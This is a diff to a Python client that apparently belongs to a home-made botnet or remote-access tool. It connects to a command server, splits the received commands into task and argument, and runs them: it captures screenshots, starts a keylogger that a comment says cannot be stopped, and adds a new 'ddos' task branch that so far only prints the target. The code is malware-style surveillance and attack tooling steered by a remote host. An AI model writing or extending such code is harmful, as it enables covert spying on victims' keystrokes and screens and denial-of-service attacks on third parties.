@@ -18,16 +18,18 @@ PORT = 1234
 def doTask(task):
 
     # Takes a screenshot at the python file location
-    if task == 'screenshot':
+    if task[0] == 'screenshot':
         print("Taking screenshot...")
         PATH = os.path.dirname('task.txt')
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save(PATH + f"screenshot_{date}" + ".png")
 
     # The keylogger cannot be stopped except by stopping the whole program!!
-    elif task == 'keylogger':
+    elif task[0] == 'keylogger':
         keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
         keylogger.start()
+    elif task[0] == 'ddos':
+        print("DDOS " + task[1])
     else:
         print("no task done")
 
@@ -41,6 +43,7 @@ while task != "stop":
         s.connect((HOST, PORT))
         s.sendall(b"Hello, world")
         data = s.recv(1024)
+        task = data.decode('utf-8').split(" ")
 
     print(f"Received {data!r}")
 
@@ -58,6 +61,6 @@ while task != "stop":
     date = datetime.now().strftime("%d_%m_%Y-%H_%M")
 
     # Execute current task
-    doTask(data)
+    doTask(task)
     print("sleep for 10 seconds")
     time.sleep(10)
